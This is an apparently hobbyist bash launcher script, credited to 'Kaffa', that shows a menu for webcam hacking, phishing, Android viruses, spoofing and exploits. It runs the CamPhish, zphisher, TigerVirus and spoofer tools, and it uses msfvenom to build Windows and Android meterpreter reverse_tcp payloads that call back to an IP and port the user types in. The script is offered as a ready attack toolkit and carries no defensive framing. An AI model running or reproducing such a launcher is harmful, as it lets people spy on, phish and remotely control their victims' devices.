clear
echo -e '\e[92;1m

  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗   ███████╗██╗  ██╗
 ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝   ██╔════╝██║  ██║
 ███████║   ██║      ██║   ███████║██║     █████╔╝    ███████╗███████║
 ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗    ╚════██║██╔══██║
 ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██╗███████║██║  ██║
 ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
                                                                     
   Coded by Kaffa

[1] Webcam Hack
[2] Phish
[3] Virus Android
[4] Spoof
[5] Exploit


'

read -p ">" num

if [ $num = 1 ]; then
clear
cd Tools
cd CamPhish
bash camphish.sh

elif [ $num = 2 ]; then
clear
cd Tools
cd zphisher
bash zphisher.sh

elif [ $num = 3 ]; then
clear
cd Tools 
cd TigerVirus
bash app.sh
fi

if [ $num = 5 ]; then
clear
read -p "Windows or Android > " sel

if [ $sel = Windows ]; then
read -p "ip? > " ipw
read -p "port? > " portw
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipw LPORT=$portw --format=exe > /home/kali/payload.exe
sleep 1
clear
exit

elif [ $sel = Android ]; then
read -p "ip? > " ipa
read -p "port? > " porta
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipa LPORT=$porta > /home/kali/payload.apk
sleep 1
clear
exit
fi

elif [ $num = 4 ]; then
clear
cd Tools
cd spoofer
bash spoofer.sh
fi
